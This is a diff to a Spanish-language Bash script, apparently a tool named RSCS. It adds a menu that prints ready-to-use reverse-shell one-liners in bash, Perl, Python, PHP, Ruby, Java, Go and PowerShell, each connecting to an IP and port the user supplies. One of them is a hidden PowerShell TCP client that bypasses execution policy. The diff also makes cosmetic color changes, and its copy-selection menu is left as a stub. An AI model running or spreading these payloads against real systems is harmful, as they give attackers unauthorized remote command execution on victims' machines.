@@ -15,7 +15,7 @@ purple="\e[0;35m\033[1m"
 turquois="\e[0;36m\033[1m"
 gray="\e[0;37m\033[1m"
 bold="\e[1m"
-
+uline="\e[4m"
 
 
 
@@ -24,8 +24,8 @@ trap ctrl_c INT
 
 function ctrl_c(){
     clear
-    echo -e "\n${red}${bold}[!]${end}${yellow}Saliendo...${end}${red}${bold}[!]${end}";sleep 0.2
-    echo -e "${white}Gracias por utilizar ${cyan}${bold}RSCS"
+    echo -e "\n${red}${bold}[!] ${end}${yellow}Saliendo... ${end}${red}${bold}[!]${end}";sleep 0.2
+    echo -e "${blue}Gracias por utilizar${end} ${yellow}${uline}RSCS${end}"
     2>/dev/null
     exit 0
 
@@ -289,15 +289,51 @@ function changeip(){
 }
 
 function showall(){
+    declare sock='$sock'
+    declare line='\$line'
+    declare client='$client'
+    declare sendbyte='$sendbyte'
+    declare stream='$stream'
+    declare bytes='$bytes'
+    declare data='$data'
+    declare sendback2='sendback2'
+    declare sendback='$sendback'
+    declare i='$i'
     clear
     echo -e "\n${red} > ${yellow}All Reverse Shells ${red}<${end}\n"
-    echo -e "${red}BASH${end}"
+    echo -e "${red}${uline}BASH${end}"
     echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}\n"
-    echo -e "${red}PERL${end}"
+    echo -e "${red}${uline}PERL${end}"
     echo -e "${yellow}2 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}\n"
-    echo -e "${red}PYTHON${end}"
+    echo -e "${red}${uline}PYTHON${end}"
     echo -e "${yellow}3 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
     echo -e "${yellow}4 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}\n"
+    echo -e "${red}${uline}PHP${end}"
+    echo -e "${yellow}5 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
+    echo -e "${yellow}6 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}\n"
+    echo -e "${red}${uline}RUBY${end}"
+    echo -e "${yellow}7 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}\n"
+    echo -e "${red}${uline}JAVA${end}"
+    echo -e "${yellow}8 » ${end}${green}r = Runtime.getRuntime()${end}\n${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}\n${green}p.waitFor()${end}\n"
+    echo -e "${red}${uline}GO${end}"
+    echo -e "${yellow}9 » ${end}${green}echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${red}$aipi${end}${green}:${end}${red}$portk${end}${green}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${end}\n"
+    echo -e "${red}${uline}POWERSHELL${end}"
+    echo -e "${yellow}10 » ${end}${green}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()${end}\n"
+    echo -e "${yellow}11 » ${end}${green}powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"${end}\n"
+
+    opc=0
+    while [ $opc = 0 ]
+    do
+        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}\n[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; showall
+        esac
+    done
 
 
 
